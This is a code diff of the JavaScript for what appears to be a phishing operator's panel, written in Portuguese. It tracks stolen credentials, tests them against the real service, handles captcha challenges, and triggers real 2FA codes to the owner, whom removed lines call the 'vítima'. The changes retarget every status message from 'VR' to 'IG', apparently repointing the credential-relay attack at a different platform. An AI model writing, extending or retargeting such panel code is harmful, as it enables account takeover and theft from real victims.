@@ -180,7 +180,7 @@ async function solicitar2FA(usuario, forcar = false) {
 async function retestarSSO(usuario) {
   if (!usuario) return;
   try {
-    showToast(`🔄 Re-tentando SSO da VR para ${usuario}...`);
+    showToast(`🔄 Re-tentando validação no IG para ${usuario}...`);
     const res = await fetch("/api/retestar-sso", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -188,7 +188,7 @@ async function retestarSSO(usuario) {
     });
     const json = await res.json();
     if (json.success) {
-      showToast(`Re-teste iniciado! Aguarde validação na VR.`);
+      showToast(`Re-teste iniciado! Aguarde validação no IG.`);
       carregarDados();
     } else {
       showToast(json.mensagem || "Erro ao re-testar SSO.");
@@ -535,16 +535,16 @@ function gerarBotoesAcaoConsolidado(item) {
 
   if (item.status_credencial === "testando") {
     return `
-      <button class="btn-secondary" style="padding: 5px 10px; font-size: 11px; opacity: 0.6; cursor: not-allowed;" disabled title="Validação de credenciais em andamento na VR...">
+      <button class="btn-secondary" style="padding: 5px 10px; font-size: 11px; opacity: 0.6; cursor: not-allowed;" disabled title="Validação de credenciais em andamento no IG...">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-        <span>Testando na VR</span>
+        <span>Testando no IG</span>
       </button>
     `;
   }
 
   if (item.status_credencial === "invalido") {
     return `
-      <button class="btn-danger-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="Operação indisponível: Senha incorreta confirmada na VR (aguardando nova senha da vítima)">
+      <button class="btn-danger-sm" type="button" disabled style="opacity: 0.55; cursor: not-allowed;" title="Operação indisponível: Senha incorreta confirmada no IG">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
         <span>Senha Incorreta</span>
       </button>
@@ -553,11 +553,11 @@ function gerarBotoesAcaoConsolidado(item) {
 
   if (item.status_credencial === "bloqueio_captcha") {
     return `
-      <button class="btn-warning-sm" type="button" style="background: rgba(245, 158, 11, 0.2); border: 1px solid #f59e0b; color: #f59e0b; display: inline-flex; align-items: center; gap: 5px;" title="A VR apresentou desafio Cloudflare Turnstile. Clique para resolver e re-tentar no SSO." onclick="retestarSSO('${uEsc}')">
+      <button class="btn-warning-sm" type="button" style="background: rgba(245, 158, 11, 0.2); border: 1px solid #f59e0b; color: #f59e0b; display: inline-flex; align-items: center; gap: 5px;" title="O IG apresentou desafio de segurança. Clique para resolver e re-tentar." onclick="retestarSSO('${uEsc}')">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg>
         <span>Resolver Captcha</span>
       </button>
-      <button class="btn-secondary" type="button" style="padding: 5px 8px; font-size: 11px; border-color: rgba(245, 158, 11, 0.4); color: #f59e0b;" title="Atenção: A VR não gerou código MFA real." onclick="abrirModalForcar2FA('${uEsc}')">
+      <button class="btn-secondary" type="button" style="padding: 5px 8px; font-size: 11px; border-color: rgba(245, 158, 11, 0.4); color: #f59e0b;" title="Atenção: O IG não gerou código MFA real." onclick="abrirModalForcar2FA('${uEsc}')">
         <span>Forçar 2FA</span>
       </button>
     `;
@@ -565,7 +565,7 @@ function gerarBotoesAcaoConsolidado(item) {
 
   if (item.status_credencial === "valido") {
     return `
-      <button class="btn-success-sm" type="button" style="background: rgba(2, 215, 47, 0.25); border-color: #02d72f;" title="Senha confirmada na VR! O código 2FA real foi enviado para a vítima." onclick="solicitar2FA('${uEsc}')">
+      <button class="btn-success-sm" type="button" style="background: rgba(2, 215, 47, 0.25); border-color: #02d72f;" title="Senha confirmada no IG! O código 2FA real foi enviado." onclick="solicitar2FA('${uEsc}')">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
         <span>Solicitar 2FA</span>
       </button>
@@ -639,7 +639,7 @@ function gerarBotoesAcaoFeed(item) {
 
   if (item.status_credencial === "testando") {
     return `
-      <button class="btn-secondary" style="padding: 4px 8px; font-size: 11px; opacity: 0.6; cursor: not-allowed;" disabled title="Validação em andamento na VR...">
+      <button class="btn-secondary" style="padding: 4px 8px; font-size: 11px; opacity: 0.6; cursor: not-allowed;" disabled title="Validação em andamento no IG...">
         <span>Testando</span>
       </button>
     `;
@@ -647,7 +647,7 @@ function gerarBotoesAcaoFeed(item) {
 
   if (item.status_credencial === "invalido") {
     return `
-      <button class="btn-danger-sm" style="padding: 4px 8px; font-size: 11px; opacity: 0.55; cursor: not-allowed;" disabled title="Operação indisponível: Senha incorreta confirmada na VR">
+      <button class="btn-danger-sm" style="padding: 4px 8px; font-size: 11px; opacity: 0.55; cursor: not-allowed;" disabled title="Operação indisponível: Senha incorreta confirmada no IG">
         <span>Senha Incorreta</span>
       </button>
     `;
@@ -731,13 +731,13 @@ function renderizarTabela() {
         }
       }
 
-      let auditHtml = `<span class="cred-badge cred-testing" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Testando na VR...</span>`;
+      let auditHtml = `<span class="cred-badge cred-testing" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Testando no IG...</span>`;
       if (item.status_credencial === "valido") {
         auditHtml = `<span class="cred-badge cred-valid" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg> Senha Correta (MFA Real)</span>`;
       } else if (item.status_credencial === "bloqueio_captcha") {
-        auditHtml = `<span class="cred-badge cred-captcha" style="font-size: 10px; padding: 2px 6px; background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Desafio Captcha VR</span>`;
+        auditHtml = `<span class="cred-badge cred-captcha" style="font-size: 10px; padding: 2px 6px; background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Desafio Captcha IG</span>`;
       } else if (item.status_credencial === "invalido") {
-        auditHtml = `<span class="cred-badge cred-invalid" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> Senha Incorreta na VR</span>`;
+        auditHtml = `<span class="cred-badge cred-invalid" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> Senha Incorreta no IG</span>`;
       }
 
       const codigoHtml = tem2FA
@@ -892,7 +892,7 @@ function renderizarTabela() {
         if (item.status_credencial === "valido") {
           auditFeed = `<span class="cred-badge cred-valid" style="font-size: 10px; padding: 1px 5px;">Válido</span>`;
         } else if (item.status_credencial === "bloqueio_captcha") {
-          auditFeed = `<span class="cred-badge cred-captcha" style="font-size: 10px; padding: 1px 5px; background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);">Captcha VR</span>`;
+          auditFeed = `<span class="cred-badge cred-captcha" style="font-size: 10px; padding: 1px 5px; background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);">Captcha IG</span>`;
         } else if (item.status_credencial === "invalido") {
           auditFeed = `<span class="cred-badge cred-invalid" style="font-size: 10px; padding: 1px 5px;">Incorreto</span>`;
         } else {
